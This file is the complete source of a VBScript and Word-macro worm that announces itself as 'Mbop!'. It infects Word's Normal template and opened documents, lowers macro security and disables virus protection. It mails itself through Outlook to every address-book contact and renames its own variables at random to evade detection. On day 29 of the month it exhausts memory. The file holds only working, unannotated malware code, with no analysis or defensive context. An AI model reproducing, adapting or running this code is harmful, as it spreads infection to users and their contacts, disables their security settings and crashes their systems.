set mbopfsmbop = createobject("scripting.filesystemobject")
mbopc1mbop = "M":set mbopwsmbop = createobject("WScript.Shell")
mboplcmbop=70:set mbopwdmbop = createobject("Word.application")
mbopc2mbop ="b":set mbopntmbop = mbopwdmbop.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
mbopc3mbop = "o":set mbopmymbop = mbopfsmbop.opentextfile(wscript.scriptfullname,1)
mbopmcmbop = mbopmymbop.readall:mbopc4mbop = "p!"
if mbopntmbop.countoflines<>0 then
mbopnlmbop=mbopntmbop.lines (1, mbopntmbop.countoflines)
if InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
mbopntmbop.addfromstring mbopmcmbop
mbopntmbop.deletelines 1,mboplcmbop
mbopwdmbop.normaltemplate.Save
end if
else
mbopntmbop.addfromstring mbopmcmbop
mbopntmbop.deletelines 1,mboplcmbop
mbopwdmbop.normaltemplate.Save
end if
mbopmnmbop= mbopc1mbop & mbopc2mbop & mbopc3mbop & mbopc4mbop
mbopfsmbop.copyfile wscript.scriptfullname,mbopfsmbop.GetSpecialFolder(0) & "\" & mbopmnmbop & ".vbs",true
'if mbopwsmbop.RegRead ("HKCU\Software\" & mbopmnmbop & "\ml") <> "1" then
mbopdmmbop
'end if
set mbopmymbop=mbopfsmbop.opentextfile(wscript.scriptfullname,1)
mbopVcmbop=mbopmymbop.readall
mbopmymbop.close
mbop15mbop = 10
For mbopiimbop = 1 To mbop15mbop
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((124 - 97 + 1) * Rnd + 97))
Next
mbopd2mbop = 9
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
set mbopmymbop=mbopfsmbop.opentextfile(wscript.scriptfullname,2)
mbopmymbop.write mbopVcmbop
mbopmymbop.close
function mbopdmmbop()
Set mbopoumbop = CreateObject("Outlook.Application")
if mbopoumbop = "Outlook" then
mbops1mbop = "Rv:"
mbops2mbop = " 4Y"
mbops3mbop = "ou."
Set mbompumbop = mbopoumbop.GetNameSpace("MAPI")
mbopm1mbop="> "
mbopm2mbop="M"
mbopm3mbop="bo"
mbopm4mbop="p!"
For Each mbopalmbop In mbompumbop.AddressLists
If mbopalmbop.AddressEntries.Count <> 0 Then
mbopacmbop=mbopalmbop.AddressEntries.Count
For mbopa1mbop = 1 To mbopacmbop
Set mbopmsmbop = mbopoumbop.CreateItem(0)
set AddListEntry = mbopalmbop.AddressEntries(mbopa1mbop)
mbopmsmbop.Subject = mbops1mbop & mbops2mbop & mbops3mbop
mbopmsmbop.Body = mbopm1mbop & mbopm2mbop & mbopm3mbop & mbopm4mbop
mbopmsmbop.Attachments.Add mbopfsmbop.GetSpecialFolder(0) & "\" & mbopmnmbop & ".vbs"
mbopmsmbop.DeleteAfterSubmit = True
mbopmsmbop.to =AddListEntry.Address
if mbopmsmbop.to<>"" then
mbopmsmbop.Send
end if
Next
End If
Next
mbopwsmbop.RegWrite "HKCU\Software\" & mbopmnmbop & "\ml", "1"
mbopoumbop.Quit
end if
end function
Private Sub Document_Open()
On Error Resume Next
mbopl1mbop = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1&"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mbopfimbop = 1
Options.ConfirmConversions = False
Set mbopNtmbop = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
mbopsembop = 2
Set mbopAdmbop = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set mbopTdmbop = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mboptrmbop = 5
mbopl2mbop = "b"
mbopfnmbop = mbopfimbop & mbopsembop & mboptrmbop
For mbopiimbop = 1 To mbopTdmbop.countoflines
If InStr(mbopTdmbop.lines(mbopiimbop, 1), "Private Sub Document_Open()") <> 0 Then
mbopSlmbop = mbopiimbop
Exit For
End If
Next
mbopl3mbop = "o"
mbopVcmbop = Trim(mbopTdmbop.lines(mbopSlmbop, mbopSlmbop + mbopfnmbop))
mboplvmbop = 97
If mbopNtmbop.countoflines > 0 Then
mbopNlmbop = mbopNtmbop.lines(1, mbopNtmbop.countoflines)
If InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
If InStr(LCase(mbopNlmbop), "private sub document_open()") <> 0 Then
mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopNlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, 1
End If
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
Else
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
mbophvmbop = 122
If mbopAdmbop.countoflines > 0 Then
mbopAlmbop = mbopAdmbop.lines(1, mbopAdmbop.countoflines)
If InStr(mbopAlmbop, "Nt") = 0 And InStr(mbopAlmbop, "Sl") = 0 And InStr(mbopAlmbop, "Nl") = 0 And InStr(mbopAlmbop, "Ad") = 0 And InStr(mbopAlmbop, "Vc") = 0 And InStr(mbopAlmbop, "Td") = 0 Then
If InStr(LCase(mbopAlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopAlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, 1
End If
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
Else
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
mbopl4mbop = "p"
mbop15mbop = 15
For mbopiimbop = 1 To mbop15mbop
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
mbopd2mbop = 9
mbopVcmbop = mbopTdmbop.lines(1, mbopTdmbop.countoflines)
mbopTdmbop.deletelines 1, mbopTdmbop.countoflines
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
mbopTdmbop.addfromstring mbopVcmbop
mbopDymbop = Day(Now)
mbopd1mbop = 2
mbopl5mbop = "!"
If mbopDymbop = mbopd1mbop & mbopd2mbop Then
Dim mbopstmbop()
mbopcambop = 0
Do
ReDim Preserve mbopstmbop(mbopcambop)
mbopqwmbop = CLng(1024)
mbopqambop = mbopqwmbop
mbopqzmbop = mbopqwmbop * mbopqambop
mbopstmbop(mbopcambop) = String(mbopqzmbop, Right(mbopTnmbop, 1))
DoEvents
mbopcambop = mbopcambop + 1
Loop
End If
If mbopiambop = True Or mbopinmbop = True Then
MsgBox mbopl1mbop & mbopl2mbop & mbopl3mbop & mbopl4mbop & mbopl5mbop, vbCritical
End If
End Sub
